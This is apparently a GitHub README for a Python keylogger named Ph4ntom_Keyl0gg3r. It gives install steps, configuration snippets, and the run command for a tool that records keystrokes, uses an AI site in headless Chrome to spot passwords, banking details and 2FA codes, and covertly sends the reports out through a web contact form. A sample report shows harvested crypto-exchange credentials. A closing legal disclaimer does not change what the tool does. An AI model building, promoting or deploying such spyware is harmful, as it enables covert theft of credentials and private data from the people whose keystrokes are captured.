
---

<p align="center">
  <img src="https://img.shields.io/badge/COD3D%20BY-LEONAMAHORO-red?style=for-the-badge&logo=matrix">
</p>
# 🔥 PH4NTOM_KEYL0GG3R 🔥

<p align="center">
  <img src="https://img.shields.io/badge/VERSION-2.0-red?style=for-the-badge&logo=hackthebox">
  <img src="https://img.shields.io/badge/PYTHON-3.8%2B-blue?style=for-the-badge&logo=python">
  <img src="https://img.shields.io/badge/STATUS-ELITE-green?style=for-the-badge&logo=matrix">
</p>

<p align="center">
  <b>⌨️ AI-Powered Keystroke Analytics • 🤖 Autonomous Threat Analysis • 📧 Covert Email Exfiltration</b>
</p>

---

## 🎯 WHAT IS THIS?

**Ph4ntom_Keyl0gg3r** captures keystrokes, sends them to an AI for **real-time threat analysis**, then emails you the report via a website form. All browser operations run **invisibly** in headless mode.

```
┌─────────────┐     ┌──────────────┐     ┌─────────────────┐
│  CAPTURE    │────▶│  ANALYZE     │────▶│  EXFILTRATE    │
│  (pynput)   │     │  (Easemate)  │     │  (Your Form)   │
└─────────────┘     └──────────────┘     └─────────────────┘
```

---

## ⚡ FEATURES

- **🔑 Key Capture** – Logs everything with special key formatting [TAB][BACKSPACE]
- **🧠 AI Analysis** – Detects passwords, crypto, banking, SSNs automatically
- **📊 Risk Scoring** – URGENT 🔴 | MODERATE 🟡 | USELESS ⚫
- **📧 Email Reports** – Sent via your website's contact form
- **🕶️ Stealth Mode** – Headless Chrome = zero visibility
- **💾 Local Backup** – Falls back to file if exfil fails
- **🔄 Smart Waiting** – Tracks AI response growth, saves when complete

---

## 🔧 INSTALL

```bash
# Clone that repo
git https://github.com/namahoroleochristian/AI-powered-python--key-logger
cd AI-powered-python--key-logger

# Install dependencies
pip install -r requirements.txt
```

**requirements.txt:**
```txt
pynput==1.7.6
selenium==4.18.1
beautifulsoup4==4.12.3
webdriver-manager==4.0.1
```

---

## ⚙️ CONFIG

Edit the sauce:

```python
# ========== CONFIG ==========
self.contact_form_url = "https://yoursite.com/contact"  # Where to send
self.your_email = "you@example.com"                      # Your inbox
self.your_name = "Ph4ntom_System"                        # Form name
self.headless_mode = True  # False to see browsers
# =============================
```

**Form must have:** `id="name"`, `id="email"`, `id="subject"`, `id="message"`

---

## 🚀 RUN

```bash
python keylogger.py
```

**Press `Ctrl+C` to stop.**

Reports every 60s. Change it:
```python
threading.Timer(60, self.reportFinalize).start()  # Edit 60
```

---

## 📨 OUTPUT EXAMPLE

**Subject:** `Keylogger Report [URGENT] - 2024-03-05 14:30:45`

```
========================================
KEYLOGGER SECURITY REPORT
========================================
Time: 2024-03-05 14:30:45
Risk Level: URGENT

========================================
AI ANALYSIS REPORT:
========================================
RISK: URGENT
SUMMARY: Found Coinbase credentials
DETAILS:
- username: "crypto_trader"
- password pattern detected
- 2FA code: 384729

========================================
RAW KEYSTROKES:
========================================
username: crypto_trader[TAB]pass: MySecretPass123[ENTER]2FA:384729
```

---

## 🧠 HOW IT ROLLS

1. **Capture** – 60s of keystrokes → memory
2. **Analyze** – Headless Chrome hits AI site, submits text, waits for complete response (tracks length, 15s stable = done)
3. **Exfil** – Headless Chrome fills your form → clicks send → email delivered
4. **Loop** – Clears log, does it again

---

## 🛠️ CUSTOMIZE

| Change | Where |
|--------|-------|
| AI site | `self.ai_url` |
| Report interval | `threading.Timer(60...` |
| Headless mode | `self.headless_mode` |
| Form fields | Edit `sendResult()` |

---

## 🐛 DEBUG

Set `self.headless_mode = False` to watch browsers in action.

---

## ⚠️ LEGAL WARNING (READ THIS)

**Using keyloggers without consent = FELONY.**

- **USA:** Up to 20 years prison + $250k fines
- **EU:** GDPR violations = €20M fines
- **Everywhere:** Civil lawsuits will destroy you

**You may ONLY use this on:**
- ✅ Your own devices
- ✅ Devices you own
- ✅ With EXPLICIT WRITTEN CONSENT

**I assume ZERO liability. You're responsible for your actions.**

---

<p align="center">
  <b>⌨️ CODE WITH POWER • USE WITH RESPONSIBILITY ⌨️</b><br>
  <sub>For educational purposes only. Don't be stupid.</sub>
</p>

